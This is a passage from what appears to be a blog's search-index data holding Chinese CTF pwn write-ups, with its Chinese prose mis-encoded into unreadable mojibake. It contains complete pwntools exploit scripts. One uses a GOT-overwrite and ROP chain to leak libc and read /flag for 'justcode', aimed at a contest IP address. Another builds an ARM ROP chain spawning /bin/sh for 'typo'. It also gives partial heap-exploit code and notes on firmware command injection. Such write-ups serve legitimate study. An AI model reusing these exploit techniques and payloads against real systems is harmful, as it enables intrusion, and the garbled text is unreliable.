choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n    \ninit_data = 'a'*8 + 'b'*8 + 'c'*8\npr.sendafter(\"4268144\",init_data)\n\nsuprise_i('1','1',1) #1\nrequest_i('1','1',1) #2\n\nrequest_i('1','1',1) #3\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\nrequest_i('1','1',1) #7\n\nsuprise_i('1','1',1) #8\nrequest_i('1','1',1) #9\nrequest_i('1','1',1) #10\nrequest_i('1','1',1) #11\nrequest_i('1','1',1) #12\n\nprint_i(1)\nedit_i(11,'1'*0x18)\nedit_i(10,'2'*0x18)\nsuprise_i(p64(0x412078),'1',1)      # mylibc.got['free'] : 0x412038  # .bss after : 0x412080\nsuprise_i('\\x78','1',0)        # x - \\x78 - 0x412078\nsuprise_i(\"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\",\"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\",0)\n\nedit_i(5,'3'*0x18)\nedit_i(4,'3'*0x18)\nrequest_i(p64(0x412088),'1',1)\nrequest_i('\\x88','1',0)\nrequest_i(\"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\",\"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\",0)\n\nrequest_i(p64(0x412088),'1',1)\nrequest_i('1'*8,'1',0)\nprint_i(1)\nrequest_i(\"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\",\"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\",0)\nprint_i(1) \n\npr.interactive()\n```\n\n\n\n# justcode\n\né¢˜ç›®æ–‡ä»¶ï¼š[justcode](justcode_200.zip)\n\n## åˆ†æ\n\næœ¬ç¨‹åºåœ¨å¼€å¤´åšäº†seccompçš„é™åˆ¶ï¼Œå¯¼è‡´æ— æ³•è°ƒç”¨execveç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤æ— æ³•get shellï¼Œè€ƒè™‘é€šè¿‡open read writeå°†flagè¯»å‡ºæ¥ã€‚å¦å¤–ï¼Œç”±äºç¨‹åºä¸­æ²¡æœ‰å¯å†™å¯æ‰§è¡Œçš„æ®µï¼Œå› æ­¤åˆ©ç”¨æ–¹å¼åŸºæœ¬ç¡®å®šåªèƒ½æ˜¯ROPã€‚\n\n![](justcode1.png)\n\næŸ¥çœ‹åæ±‡ç¼–çš„æºç ï¼š\n\n![](justcode2.png)\n\nè¿™ä¸ªå‡½æ•°ä¸­ï¼Œread144ä¸ªå­—èŠ‚æ—¶ç”±äºè¦†ç›–åˆ°canaryä¼šå¯¼è‡´è¿›å…¥é”™è¯¯å¤„ç†å‡½æ•°ã€‚\n\n![](justcode3.png)\n\nè¿™ä¸ªå‡½æ•°ä¸­scanfä½¿ç”¨ä¸æ­£ç¡®ï¼Œå¯¼è‡´åœ¨æ ˆä¸Šå–å€¼ï¼ˆv1ï¼‰åšåœ°å€å†™å…¥ä»»æ„å†…å®¹ã€‚\n\n![](justcode4.png)\n\nä»¥ä¸Šä¿©å‡½æ•°åœ¨mainå‡½æ•°ä¸­æ˜¯å¹¶è¡Œçš„å…³ç³»ï¼Œå› æ­¤ä»–ä»¬çš„æ ˆä¼šå¤ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶v1çš„å€¼ï¼Œé‚£ä¹ˆå°±è¾¾åˆ°äº†ä»»æ„åœ°å€å†™ã€‚\n\n\n\n## åˆ©ç”¨\n\nï¼ˆ1ï¼‰sub_400c47  -->ï¼ˆ2ï¼‰sub_400cca  --> ï¼ˆ3ï¼‰sub_400c47\n\nï¼ˆ1ï¼‰å¸ƒç½®å¥½æ ˆä¸­çš„æ•°æ®ï¼Œæ§åˆ¶ï¼ˆ2ï¼‰ä¸­éœ€è¦ç”¨åˆ°çš„v1ä¸ºevil_addr\n\nï¼ˆ2ï¼‰è¿›å…¥åè¾“å…¥evil_contentï¼Œè¾¾åˆ°ä»»æ„åœ°å€å†™\n\nï¼ˆ3ï¼‰å›åˆ°æœ‰æ ˆæº¢å‡ºçš„å‡½æ•°ï¼Œè§¦å‘`__stack_chk_fail`ã€‚è¿™é‡Œé€‰æ‹©`__stack_chk_fail`æ˜¯å› ä¸ºï¼Œgotè¡¨é¡¹ä¸­çš„å…¶ä»–å‡½æ•°éƒ½å·²ç»è°ƒç”¨è¿‡äº†ï¼Œå­˜åœ¨è¡¨é¡¹ä¸­çš„åœ°å€éƒ½æ˜¯å¤§äº32ä½çš„ï¼Œæˆ‘ä»¬æ— æ³•\n\npsï¼šç”±äºï¼ˆ2ï¼‰ä¸­v1å’Œ%dçš„é™åˆ¶ï¼Œåœ¨æ„é€ evil_addrå’Œevil_contentæ—¶è¦æ³¨æ„ï¼\n\n![](justcode5.png)\n\næ•´ç†ä¸‹æ€è·¯ï¼š\n\nsub_400c47ä¸­å¸ƒç½®å¥½æ ˆï¼Œæ§åˆ¶ä¸‹ä¸€ä¸ªå‡½æ•°çš„v1å€¼ï¼Œæˆ‘ä»¬é€‰`__stack_chk_fail`çš„gotè¡¨é¡¹ï¼›\n\nsub_400cca scanfæ—¶è¾“å…¥gadgetåœ°å€ï¼Œè¾¾åˆ°å½“è°ƒç”¨`__stack_chk_fail`æ—¶å»æ‰§è¡Œæˆ‘ä»¬çš„gadgetï¼›\n\nsub_400c47ä¸­æ ˆæº¢å‡ºå¯¼è‡´canaryæ£€æµ‹æ—¶å‡ºé”™å¹¶è¿›å…¥`__stack_chk_fail`ï¼Œå³gadgetã€‚\n\n### ä»»æ„åœ°å€å†™\n\n```python\nv1 = myelf.got['__stack_chk_fail']\npayload1 = p64(0) + p32(0) + p32(v1) + 'aaaaaaaabbbbbbbb'\npr.recvuntil(\"name:\")\npr.sendline(payload1)\n\n## 3 \ninit_gadget = '4198050'    # 0x400ea2 - pop_r15_re_gadget\npr.recvuntil(\"id:\")\npr.sendline(init_gadget)\npr.recvuntil(\"info:\")\npr.sendline('oooooooo')\n```\n\ngadgeté€‰æ‹©äº†libc_csu_initçš„é€šç”¨gadget\n\n### æ³„éœ²libc\n\n```python\n# init1 = 0x400e96\n# init2 = 0x400e80\nputs_got = myelf.got['puts']\npayload2 = flat([0x400e96,0,0,1,puts_got,0,0,puts_got,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# leak libc\nlibc_base = u64(pr.recvline()[:-1].ljust(8,'\\x00')) - mylibc.symbols['puts']\n```\n\n### read(0,0x6020e0,0x40)\n\nå¸ƒç½®openï¼Œwriteï¼Œâ€œ/flagâ€åˆ°ä¸€ä¸ªå¯å†™å¯è¯»çš„æ®µï¼Œè¿™é‡Œé€‰æ‹©.bssæ®µåä»»æ„ä¸€ä¸ªåœ°å€\n\n```python\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,read_got,0x40,0x6020e0,0,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# write open,write,/flag to 0x6020e0,0x6020e8,0x6020f0\nopen_addr = libc_base + mylibc.symbols['open']\nwrite_addr = libc_base + mylibc.symbols['write']\ncont1 = flat([open_addr,write_addr,'/flag'])\npr.send(cont1)\n```\n\n### open(â€œ/flagâ€,0)\n\npwné¢˜é‡Œ0 1 2åˆ†åˆ«ç»™stdin stdout stderrå æ®ï¼Œopenè¿”å›çš„fdä¸€èˆ¬ä¸º3ï¼Œå¦‚æœä¸æ˜¯å¯ä»¥ä¾æ¬¡å¾€åå°è¯•ã€‚\n\n```python\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,0x6020e0,0x0,0x0,0x6020f0,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# fd = open('/flag',0),fd = 3?\n```\n\n### read(3,0x602110,100)\n\nç”¨open(â€œ/flagâ€)è¿”å›çš„fdå°†flagå†…å®¹è¯»å–åˆ°ä¸€æ®µå¯å†™å¯è¯»çš„åœ°å€ç©ºé—´ï¼Œè¿™é‡Œä¾æ—§é€‰.bssæ®µåçš„ä»»æ„ä¸€ç«¯åœ°å€ã€‚\n\n```python\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,read_got,100,0x602110,3,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# read(3,0x602110,100)\n```\n\n### write(1,0x602110,100)\n\nå°†ä¸Šä¸€æ­¥å†™å…¥åˆ°åœ°å€ç©ºé—´ä¸­flagçš„å†…å®¹é€šè¿‡writeè¾“å‡ºåˆ°stdoutï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨æœ¬åœ°æ¥æ”¶åˆ°äº†ï¼\n\n```python\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,0x6020e8,100,0x602110,1,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# write(1,0x602110,100)\n\nres = pr.recvline()\nprint res\n```\n\næ‹¿åˆ°flag\n\n![](justcode6.png)\n\n## å®Œæ•´exp\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyelf = ELF('./justcode')\nmylibc = ELF('./libc-2.23.so')\n#mylibc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')\n\n#pr = process(myelf.path)\npr = remote('183.129.189.60',10032)\n\npr.recvuntil(\"your code:\")\npr.sendline('1')\npr.sendline('1')\npr.sendline('2')\npr.sendline('1')\n## call _puts : 0x400da0\n## jmp __chk_fail : 0x400960\n## leave :0x400cc8\n\n## 1\npr.recvuntil(\"name:\")\n#gdb.attach(pr,'b *0x400ea0 \\n c')\npr.sendline()\n\n## 2\nv1 = myelf.got['__stack_chk_fail']\npayload1 = p64(0) + p32(0) + p32(v1) + 'aaaaaaaabbbbbbbb'\npr.recvuntil(\"name:\")\npr.sendline(payload1)\n\n## 3 \ninit_gadget = '4198050'    # 0x400ea2 - pop_r15_re_gadget\npr.recvuntil(\"id:\")\npr.sendline(init_gadget)\npr.recvuntil(\"info:\")\npr.sendline('oooooooo')\n\n## 4\n# init1 = 0x400e96\n# init2 = 0x400e80\nputs_got = myelf.got['puts']\npayload2 = flat([0x400e96,0,0,1,puts_got,0,0,puts_got,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# leak libc\nlibc_base = u64(pr.recvline()[:-1].ljust(8,'\\x00')) - mylibc.symbols['puts']\n\n\n# 5\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,read_got,0x40,0x6020e0,0,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# write open,write,/flag to 0x6020e0,0x6020e8,0x6020f0\nopen_addr = libc_base + mylibc.symbols['open']\nwrite_addr = libc_base + mylibc.symbols['write']\ncont1 = flat([open_addr,write_addr,'/flag'])\npr.send(cont1)\n\n\n# 6 \nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,0x6020e0,0x0,0x0,0x6020f0,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# fd = open('/flag',0),fd = 3?\n\n\n# 7 \nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,read_got,100,0x602110,3,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# read(3,0x602110,100)\n\n\n# 8\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,0x6020e8,100,0x602110,1,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# write(1,0x602110,100)\n\nres = pr.recvline()\nprint res\n\npr.interactive()\n```\n\n# blinkblink\n\né¢˜ç›®æ–‡ä»¶ï¼š[blinkblink](BlinkBlink_200.zip)\n\n## å°è¯•è®¿é—®\n\nncè¿ä¸Šç»™çš„ip \n\n![](blinkblink1.png)\n\næµè§ˆå™¨æ‰“å¼€\n\n![](blinkblink2.png)\n\nå°è¯•ç™»é™†ï¼ŒæŸ¥çœ‹ç½‘é¡µæ–‡ä»¶æºç \n\n![](blinkblink3.png)\n\nå‘ç°getinfo.jsä¸­æœ‰urlï¼Œå°è¯•è®¿é—®\n\n![](blinkblink4.png)\n\næœ‰è¿”å›å€¼\n\n![](blinkblink5.png)\n\nè¯¥jsä¸­æœ‰144ä¸ªurl\n\n![](blinkblink6.png)\n\n## åˆ†ææœ¬åœ°å›ºä»¶åŒ…\n\nä¸‹è½½ä¸‹æ¥çš„å›ºä»¶åŒ…ç”¨binwalkè§£åŒ…ï¼Œæ‰¾åˆ°äº†login.aspä»¥åŠgetinfo.js\n\n![](blinkblink7.png)\n\né™¤äº†getinfo.jsï¼Œè¿˜åœ¨goaheadä¸­æ‰¾åˆ°æœ‰\n\n![](blinkblink8.png)\n\ngoaheadæ˜¯ä¸€ä¸ªåµŒå…¥å¼webæœåŠ¡å™¨ï¼šhttps://www.embedthis.com/goahead/\n\nIDAåˆ†ægoaheadï¼ŒæŸ¥æ‰¾å­—ç¬¦ä¸²â€™set_qos_cfgâ€™ï¼Œæ‰¾åˆ°å¦‚ä¸‹å¼•ç”¨\n\n![](blinkblink9.png)\n\nç»§ç»­æŸ¥çœ‹å¯¹è¯¥å‡½æ•°çš„å¼•ç”¨\n\n![](blinkblink10.png)\n\nè¿™é‡Œçš„æ¥å£æ¯”getinfo.jsä¸­çš„è¦å¤šï¼Œå‘ç°ä¸€ä¸ªcmdï¼Œå¾ˆå¯ç–‘ï¼š\n\n![](blinkblink11.png)\n\nè·Ÿè¿›sub_44d41c\n\n![](blinkblink12.png)\n\nç»è¿‡æŸ¥æ‰¾ï¼Œbs_SetCmdå‡½æ•°çš„å®šä¹‰åœ¨libshare-0.0.26.soä¸­ã€‚è¯¥å‡½æ•°å°†cmdé”®å¯¹åº”çš„å€¼ç›´æ¥æ‰§è¡Œï¼Œ\n\n![](blinkblink13.png)\n\nå°è¯•è®¿é—®\n\n![](blinkblink14.png)","categories":["CTF"]},{"title":"arm pwnå…¥é—¨","url":"/2021/01/27/arm-pwn-start/","content":"\n# arm pwnåŸºæœ¬æŠ€èƒ½\n\n## qemuè°ƒè¯•armç”¨æˆ·æ€ç¨‹åº\n\n```shell\n# ä½¿ç”¨qemu-armå°†ç¨‹åºè¿è¡Œèµ·æ¥ï¼Œå¹¶æŒ‡å®šä¸€ä¸ªç«¯å£ç”¨äºè¿æ¥gdb\nqemu-arm -g xxx ./arm-bin\n\n# ä½¿ç”¨gdb-multiarchæŒ‡å®šarmç¨‹åº\ngdb-multiarch ./arm-bin\ngef> set architecture arm\ngef> set endian little\ngef> target remote :xxx\n\n# gdb-multiarchæŒ‡å®šconfigæ–‡ä»¶\ngdb-multiarch -x mygdb.cfg ./arm-bin\n```\n\nè°ƒè¯•mipsç¨‹åºçš„è®¾ç½®ä¹Ÿç±»ä¼¼\n\n```shell\n# å¯åŠ¨mipsåº”ç”¨ç¨‹åºï¼Œå¹¶æŒ‡å®šè°ƒè¯•ç«¯å£\nqemu-mips -g xxx ./mips-bin\nqemu-mips -g xxx -L ./ ./mips-bin  # ä½¿ç”¨-LæŒ‡å®šåŒ…å«åŠ¨æ€åº“çš„lib/ç›®å½•\n\n# gdb-multiarchå¯åŠ¨è°ƒè¯•\ngdb-multiatch ./mips-bin\ngef> set architecture mips\ngef> set endian big\ngef> target remote :xxx\n```\n\n## å®‰è£…arm64çš„libåº“\n\n```shell\nsudo apt search \"libc6-\" | grep \"arm\"\nsudo apt install libc6-arm64-cross\n# å®‰è£…å¥½çš„åº“/usr/aarch64-linux-gnu/lib/ç›®å½•ä¸‹\n```\n\n`qemu-aarch64`æ‰§è¡Œæ—¶é€šè¿‡`-L`æŒ‡å®š`/usr/aarch64-linux-gnu`ç›®å½•å³å¯ï¼Œå¦‚ï¼š\n\n```shell\nqemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn\n```\n\n# ç»ƒä¹ é¢˜ - typo\n\né¢˜ç›®æ–‡ä»¶ï¼š[typo](typo)\n\n## åˆ†æ\n\næŸ¥çœ‹æ–‡ä»¶å±æ€§ï¼Œarm32ä½å¯æ‰§è¡Œç¨‹åºï¼Œé™æ€è¿æ¥ï¼Œå»ç¬¦å·è¡¨ã€‚\n\næŸ¥çœ‹ç¼–è¯‘é€‰é¡¹ï¼Œæ ˆæ— canaryä½†æ ˆä¸å¯æ‰§è¡Œï¼Œç¨‹åºæœªå¼€å¯éšæœºåŒ–æ•…åŠ è½½åŸºå€å›ºå®šã€‚\n\n```shell\nbling@Ubuntu2004:~/ctf$ file ./typo\n./typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped\n\nbling@Ubuntu2004:~/ctf$ checksec --file=./typo\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\t\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH \nSymbols\t\tFORTIFY\tFortified\tFortifiable  FILE\nNo Symbols      No\t0\t\t0\t./typo\n```\n\né€šè¿‡start()å‡½æ•°æˆ–å…³é”®å­—ç¬¦ä¸²çš„äº¤å‰å¼•ç”¨æ¥å¯»æ‰¾main()å‡½æ•°ã€‚\n\n- startå‡½æ•°ä¸­LDR R0,=sub_8F00ä¸­çš„sub_8F00å°±æ˜¯mainå‡½æ•°\n\n  ```shell\n  .text:00008BB4                 PUSH    {R12}\n  .text:00008BB8                 LDR     R0, =sub_8F00\n  .text:00008BBC                 LDR     R3, =0xA5EC\n  .text:00008BC0                 BL      sub_9EBC\n  .text:00008BC4                 BL      sub_F0E0\n  .text:00008BC4 ; End of function start\n  ```\n\n- å…³é”®å­—ç¬¦ä¸²ï¼Œå¦‚è¿è¡Œæ—¶æ‰“å°çš„`Let's Do Some Typing Exercise~`ï¼Œåœ¨IDAä¸­å¯»æ‰¾å¯¹è¯¥å­—ç¬¦ä¸²çš„å¼•ç”¨\n\nå¯¹äºè¿™ç§è¾“å…¥ç±»çš„é¢˜ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯è¾“å…¥ä¸€ä¸ªè¶…é•¿å­—ç¬¦ä¸²çœ‹ç¨‹åºä¼šä¸ä¼šå´©ã€‚æœç„¶å´©æ‰äº†ã€‚\n\n```shell\n$ qemu-arm ./typo\nLet's Do Some Typing Exercise~\nPress Enter to get start;\nInput ~ if you want to quit\n\n------Begin------\nconsequently\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nqemu: uncaught target signal 11 (Segmentation fault) - core dumped\nSegmentation fault (core dumped)\n```\n\nä½¿ç”¨gdb-multiarchè°ƒè¯•ä¸€ä¸‹å´©æºƒä½ç½®ï¼Œæ˜¯å¦è¦†ç›–äº†è¿”å›åœ°å€\n\n- qemu-armä¾§\n\n  ```shell\n  $ qemu-arm -g 1234 ./typo\n  ```\n\n- gdb-multiarchä¾§\n\n  ```shell\n  $ gdb-multiarch ./typo\n  GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1\n  pwndbg> set architecture arm\n  The target architecture is assumed to be arm\n  pwndbg> set endian little\n  The target is assumed to be little endian\n  pwndbg> target remote :1234\n  Remote debugging using :1234\n  ```\n\n  è¿™é‡Œåœ¨gdbå†…è®¾ç½®çš„setå’Œtarget remoteéƒ½å¯ä»¥å†™åœ¨ä¸€ä¸ªé…ç½®æ–‡æ¡£é‡Œï¼Œé€šè¿‡`gdb-multiarch -x abc.cfg`æŒ‡å®šã€‚\n\n- pwntoolsç”Ÿæˆå­—ç¬¦ä¸²pattern\n\n  ```shell\n  >>> from pwn import *\n  >>> cyclic(200)\n  'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'\n  ```\n\næ¥ä¸‹æ¥ï¼š\n\n1. gdb-multiarchå†…æ‰§è¡Œ`c`\n\n2. qemu-armç•Œé¢ï¼Œå›è½¦åï¼Œå°†ä¸Šè¿°200ä¸ªå­—ç¬¦è¾“å…¥\n\n3. å›åˆ°gdb-multiarchç•Œé¢ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹å¯„å­˜å™¨ä¿¡æ¯ï¼ŒPCæŒ‡é’ˆè¢«æˆ‘ä»¬çš„è¾“å…¥è¦†ç›–äº†\n\n   ```shell\n   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n    R0   0x0\n   *R1   0xfffeeed4 â—‚â€” 0x61616161 ('aaaa')\n   *R2   0x7e\n    R3   0x0\n   *R4   0x62616162 ('baab')\n    R5   0x0\n    R6   0x0\n    R7   0x0\n    R8   0x0\n   *R9   0xa5ec â—‚â€” push   {r3, r4, r5, r6, r7, r8, sb, lr}\n   *R10  0xa68c â—‚â€” push   {r3, r4, r5, lr}\n   *R11  0x62616163 ('caab')\n    R12  0x0\n   *SP   0xfffeef48 â—‚â€” 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\\n'\n   *PC   0x62616164 ('daab')\n   ```\n\n4. åœ¨pwntoolsä¸­ç¡®å®š`'daab'`çš„åç§»é‡ï¼Œä¸º112\n\n   ```sh\n   >>> cyclic_find('daab')\n   112\n   ```\n\n5. å› æ­¤ï¼Œæˆ‘ä»¬é€šè¿‡padding 112ä¸ªå­—ç¬¦ï¼Œå°±èƒ½è¦†ç›–å‡½æ•°è¿”å›åœ°å€ï¼ŒåŠ«æŒæ§åˆ¶æµ\n\n## åˆ©ç”¨\n\n### æ–¹æ³•1 - ret2shellcode\n\n> [ç°æˆçš„shellcode](http://shell-storm.org/shellcode/)\n\n### æ–¹æ³•2 - ropï¼šsvc\n\n> svcï¼šid=0xbï¼›R0=addr(\"/bin/sh\")ï¼›R1=0ï¼›R2=0 \n>\n> ä»¥ä¸Šç³»ç»Ÿè°ƒç”¨ç­‰åŒäºexecve(\"/bin/sh\",0,0)\n\næ‰¾åˆ°`/bin/sh`å­—ç¬¦ä¸²åœ°å€ï¼š\n\n```shell\n$ ROPgadget --binary ./typo --string /bin/sh\nStrings information\n============================================================\n0x0006c384 : /bin/sh\n```\n\næ‰¾ropgadgetï¼š\n\n```shell\n$ ROPgadget --binary ./typo --only \"pop\"\nGadgets information\n============================================================\n0x00008d1c : pop {fp, pc}\n0x00020904 : pop {r0, r4, pc}\n0x00068bec : pop {r1, pc}\n0x00008160 : pop {r3, pc}\n0x0000ab0c : pop {r3, r4, r5, pc}\n0x0000a958 : pop {r3, r4, r5, r6, r7, pc}\n0x00008a3c : pop {r3, r4, r5, r6, r7, r8, fp, pc}\n0x0000a678 : pop {r3, r4, r5, r6, r7, r8, sb, pc}\n0x00008520 : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}\n0x00068c68 : pop {r3, r4, r5, r6, r7, r8, sl, pc}\n0x00014a70 : pop {r3, r4, r7, pc}\n0x00008de8 : pop {r4, fp, pc}\n0x000083b0 : pop {r4, pc}\n0x00008eec : pop {r4, r5, fp, pc}\n0x00009284 : pop {r4, r5, pc}\n0x000242e0 : pop {r4, r5, r6, fp, pc}\n0x000095b8 : pop {r4, r5, r6, pc}\n0x000212ec : pop {r4, r5, r6, r7, fp, pc}\n0x000082e8 : pop {r4, r5, r6, r7, pc}\n0x00043110 : pop {r4, r5, r6, r7, r8, fp, pc}\n0x00011648 : pop {r4, r5, r6, r7, r8, pc}\n0x00048e9c : pop {r4, r5, r6, r7, r8, sb, fp, pc}\n0x0000a5a0 : pop {r4, r5, r6, r7, r8, sb, pc}\n0x0000870c : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}\n0x00011c24 : pop {r4, r5, r6, r7, r8, sb, sl, pc}\n0x000553cc : pop {r4, r5, r6, r7, r8, sl, pc}\n0x00023ed4 : pop {r4, r5, r7, pc}\n0x00023dbc : pop {r4, r7, pc}\n0x00014068 : pop {r7, pc}\n\nUnique gadgets found: 29\n```\n\næ‰¾`svc`ï¼š\n\n```shell\n$ ROPgadget --binary ./typo | grep 'svc #0'\n0x0001aca8 : svc #0 ; pop {r4, r5, r6, r7, r8, pc}\n0x00019568 : svc #0 ; pop {r4, r5, r6, r7, r8, sb, pc}\n0x000482fc : svc #0 ; pop {r7} ; bx lr\n0x00048310 : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! \n0x000482fc : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! \n0x00048324 : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! \n......\n```\n\næ‰¾`mov`æŒ‡ä»¤ï¼š\n\n```shell\n$ ROPgadget --binary ./typo | grep 'mov r2, r4'\n0x0003338c : mov r2, r4 ; blx r3\n0x0000f600 : mov r2, r4 ; blx sb\n0x00069950 : mov r2, r4 ; mov r3, r4 ; blx r8\n0x00013310 : mov r2, r4 ; mov r3, r5 ; blx r1\n......\n```\n\næˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯ï¼š\n\n- R0 = \"/bin/sh\"\n- R1 = 0\n- R2 = 0\n- R7 = 0xb ï¼ˆå¯¹åº”armä¸‹execveçš„ç³»ç»Ÿè°ƒç”¨ï¼‰\n- Rx = svc\n\næ ¹æ®ç›®æ ‡ï¼Œæ„é€ äº†å¦‚ä¸‹ropé“¾ï¼š\n\n```shell\ng1 - 0x00020904 : pop {r0, r4, pc}\ng2 - 0x00068bec : pop {r1, pc}\ng3 - 0x00023dbc : pop {r4, r7, pc}\ng4 - 0x00008160 : pop {r3, pc}\ng5 - 0x0003338c : mov r2, r4 ; blx r3\n====stack high====\ng5\n0x0001aca8\t\t# \"svc\"åœ°å€\ng4\n0xb\n0\ng3\n0\ng2\n0\n0x0006c384\t\t# \"/bin/sh\"å­—ç¬¦ä¸²åœ°å€\ng1\n====stack low====\n```\n\nä»¥ä¸Šropé“¾å¯¹åº”çš„payloadä¸ºï¼š\n\n```shell\npayload = p32(0x00020904)+p32(0x0006c384)+p32(0)+p32(0x00068bec)+p32(0)+p32(0x00023dbc)+p32(0)+p32(0xb)+p32(0x00008160)+p32(0x0001aca8)+p32(0x0003338c)\n```\n\nå®Œæ•´expå¦‚ä¸‹ï¼š\n\n```shell\nfrom pwn import *\ncontext(arch='arm',log_level='debug')\n\nmyproc = process(['qemu-arm','./typo'])\n\nmyproc.recvuntil(\"quit\\n\")\nmyproc.send(\"\\n\")\n\npayload = p32(0x00020904)+p32(0x0006c384)+p32(0)+p32(0x00068bec)+p32(0)+p32(0x00023dbc)+p32(0)+p32(0xb)+p32(0x00008160)+p32(0x0001aca8)+p32(0x0003338c)\nexp = 'a'*112 + payload\n\nmyproc.recv()\nmyproc.sendline(exp)\n\nmyproc.interactive()\n```\n\n### æ–¹æ³•3 - ropï¼šfunc(\"/bin/sh\")\n\n> system(\"/bin/sh\") æˆ–è€… execve(\"/bin/sh\",0,0)\n>\n> ä½¿ç”¨ç±»ä¼¼pop {r0,pc}çš„gadgetï¼Œå®ç°å¯¹r0ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ï¼‰å’Œpcçš„æ§åˆ¶ï¼Œä»è€ŒåŠ«æŒæ§åˆ¶æµåˆ°**system(\"/bin/sh\")**\n\n# ç»ƒä¹ é¢˜ - 